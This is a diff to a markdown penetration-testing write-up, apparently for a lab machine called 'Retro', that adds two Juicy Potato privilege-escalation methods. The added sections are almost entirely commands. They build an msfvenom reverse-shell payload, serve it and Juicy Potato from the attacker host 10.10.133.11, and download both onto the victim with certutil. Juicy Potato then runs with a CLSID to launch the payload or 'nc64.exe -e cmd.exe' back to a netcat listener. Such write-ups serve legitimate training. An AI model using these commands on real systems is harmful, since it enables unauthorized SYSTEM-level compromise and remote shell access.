@@ -462,12 +462,7 @@ Invoke-AllChecks
 
 
 
-**Victim(cmd)**
 
-```
-cd C:\
-mkdir test
-```
 
 
 
@@ -517,3 +512,76 @@ Open the cmd prompt and it open as an Administrator account, but note if you alr
 <figure><img src="../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>
+
+## Privilege Escalation Option #2&#x20;
+
+Since the web user had more access than Wade but we couldn't write anywhere I made a folder that they could write to.
+
+**Kali**
+
+```
+wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
+msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.133.11 lport=1337 -f exe -o exploit.exe
+python2 -m SimpleHTTPServer 81
+```
+
+**Victim(cmd) - Wade**
+
+```
+cd C:\
+mkdir test
+cd test
+certutil -urlcache -f http://10.10.133.11:81/JuicyPotato.exe JuicyPotato.exe
+certutil -urlcache -f http://10.10.133.11:81/exploit.exe exploit.exe
+```
+
+**Kali**
+
+```
+nc -lvnp 1337
+```
+
+**Victim(cmd) - retro**
+
+```
+JuicyPotato.exe -l 1337 -p exploit.exe -t * -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}" 
+```
+
+<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
+
+## Privilege Escalation Option #3&#x20;
+
+This is still with Juicy Potato but just a slightly different way using nc64.exe instead of a reverse shell.
+
+**Kali**
+
+```
+git clone https://github.com/int0x33/nc.exe.git
+cd nc.exe/
+wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
+python2 -m SimpleHTTPServer 81
+```
+
+**Victim(cmd) - Wade**
+
+```
+cd C:\
+mkdir test
+cd test
+certutil -urlcache -f http://10.10.133.11:81/JuicyPotato.exe JuicyPotato.exe
+certutil -urlcache -f http://10.10.133.11:81/nc64.exe nc64.exe
+```
+
+**Kali**
+
+```
+nc -lvnp 1337
+```
+
+**Victim(cmd) - retro**
+
+```
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\test\nc64.exe -e cmd.exe 10.10.133.11 1337 " -t *  -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}" 
+```
+
+<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
